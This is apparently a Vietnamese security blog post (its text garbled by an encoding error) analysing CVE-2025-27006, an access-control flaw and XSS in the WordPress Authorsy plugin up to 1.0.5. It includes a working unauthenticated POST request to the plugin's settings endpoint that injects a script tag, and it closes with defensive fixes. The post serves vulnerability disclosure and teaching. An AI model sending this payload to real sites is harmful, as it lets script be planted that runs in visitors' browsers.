# CVE-2025-27006 Analysis & POC


<!--more-->

L·ªó h·ªïng x·∫£y ra tr√™n plugin **Authorsy** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **1.0.6**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.

* **CVE ID**: [CVE-2025-27006](https://www.cve.org/CVERecord?id=CVE-2025-27006)
* **Product**: [WordPress Authorsy Plugin](https://wordpress.org/plugins/authorsy/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 1.0.5
* **CVSS severity**: Medium (6.5)
* **OWASP Top 10**: A1: Broken Access Control
* **Required Privilege**: Subscriber

> Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn **Subscriber** nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c **Unauthenticated**.

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Authorsy**: v1.0.5(vul) v√† v1.0.6(fix)
* **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

## Analysis

·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong `wp_options` v√† ch√®n tr·ª±c ti·∫øp v√†o `<style>` tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† **kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn**, d·∫´n ƒë·∫øn nguy c∆° **Broken Access Control** v√† c√≥ th·ªÉ **XSS** n·∫øu ch√®n payload ƒë·ªôc h·∫°i.

### Patch Diff

D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file **core/settings/api-settings.php** v√† **core/enqueue-inline/enqueue-inline.php**

{{< figure src="diff1.png" caption="Diff showing changes in enqueue-inline.php to sanitize custom CSS" >}}

{{< figure src="diff2.png" caption="Diff showing REST API permission callback changes in api-settings.php" >}}

## Exploit

### Detect XSS

G·ª≠i **POST** request ƒë·∫øn `/wp-json/authorsy/v1/settings` v·ªõi XSS payload:

```http
POST /wp-json/authorsy/v1/settings HTTP/1.1
Host: localhost

Content-Type: application/json

{
"primary_color":"</style><script>alert(document.domain)</script><style>"
}
```

Ta ƒë√≥ng th·∫ª `<style>` (CSS trong head) v√† inject th√™m th·∫ª `<script>` ch·ª©a XSS payload.

Truy c·∫≠p m·ªôt trang b·∫•t k·ª≥.

{{< figure src="xss.png" caption="XSS payload injected via custom CSS" >}}

üëâ XSS th√†nh c√¥ng, **inspect** ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o.

```html
<style>
    :root { 
        --ea-color-main: </style><script>alert(document.domain)</script><style>;  
    } 
</style>
```

## Conclusion

L·ªó h·ªïng `CVE-2025-27006` trong plugin **Authorsy <= 1.0.5** l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ **Broken Access Control** k·∫øt h·ª£p v·ªõi **XSS**. Nguy√™n nh√¢n ch√≠nh l√†:

1. **REST API** kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi `/wp-json/authorsy/v1/settings` ƒë·ªÉ thay ƒë·ªïi c√°c option.
2. **CSS** t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c **sanitize**: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o `<style>` trong `<head>`, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload `<script>` th√¥ng qua CSS.
   Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: **verify_nonce** ch·ªâ tr·∫£ v·ªÅ **WP_Error** m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu.

**Key takeaways**:

* **REST API** c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng `permission_callback` h·ª£p l√Ω ƒë·ªÉ ngƒÉn **Broken Access Control**.
* Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng **XSS**.

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress Authorsy Plugin <= 1.0.5 is vulnerable to Cross Site Scripting (XSS)](https://patchstack.com/database/wordpress/plugin/authorsy/vulnerability/wordpress-authorsy-plugin-1-0-5-cross-site-scripting-xss-vulnerability)


---

> T√°c gi·∫£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-04-cve-2025-27006/  

